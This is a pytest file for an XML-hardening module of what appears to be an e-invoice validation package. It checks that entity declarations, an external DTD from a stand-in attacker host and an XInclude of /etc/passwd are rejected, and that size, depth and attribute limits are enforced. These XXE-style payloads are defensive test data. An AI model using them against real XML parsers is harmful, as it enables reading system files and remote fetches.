from __future__ import annotations

import pytest

from rechnungsprobe.profiles import bundled_seed_path
from rechnungsprobe.security import SecurityError
from rechnungsprobe.xmlsafe import XmlLimits, load_xml, parse_xml_bytes


def test_official_seed_passes_hardened_xml_preflight() -> None:
    document = load_xml(bundled_seed_path())

    assert document.root.tag.endswith("}Invoice")
    assert document.sha256 == "3558d8eee6499350f69c150b54b4019556458667cfc972beaa9bb7bf1e11303f"


@pytest.mark.parametrize(
    "payload",
    [
        b'<!DOCTYPE x [<!ENTITY e "boom">]><x>&e;</x>',
        b'<!DOCTYPE x SYSTEM "https://attacker.invalid/evil.dtd"><x/>',
        (
            b'<x xmlns:xi="http://www.w3.org/2001/XInclude">'
            b'<xi:include href="file:///etc/passwd"/></x>'
        ),
    ],
)
def test_xml_preflight_rejects_active_xml_features(payload: bytes) -> None:
    with pytest.raises(SecurityError):
        parse_xml_bytes(payload)


def test_xml_preflight_rejects_oversized_input() -> None:
    with pytest.raises(SecurityError, match="size"):
        parse_xml_bytes(b"<x>" + b"a" * 101 + b"</x>", XmlLimits(max_bytes=100))


def test_xml_preflight_rejects_excessive_depth() -> None:
    payload = b"<a><b><c><d/></c></b></a>"

    with pytest.raises(SecurityError, match="depth"):
        parse_xml_bytes(payload, XmlLimits(max_depth=3))


def test_xml_preflight_rejects_excessive_attributes() -> None:
    with pytest.raises(SecurityError, match="attributes"):
        parse_xml_bytes(b'<x a="1" b="2"/>', XmlLimits(max_attributes_per_element=1))


def test_xml_preflight_rejects_oversized_embedded_document() -> None:
    payload = (
        b'<x xmlns:cbc="urn:oasis:names:specification:ubl:schema:xsd:'
        b'CommonBasicComponents-2"><cbc:EmbeddedDocumentBinaryObject>'
        b"AAAAA"
        b"</cbc:EmbeddedDocumentBinaryObject></x>"
    )

    with pytest.raises(SecurityError, match="attachment"):
        parse_xml_bytes(payload, XmlLimits(max_attachment_text=4))
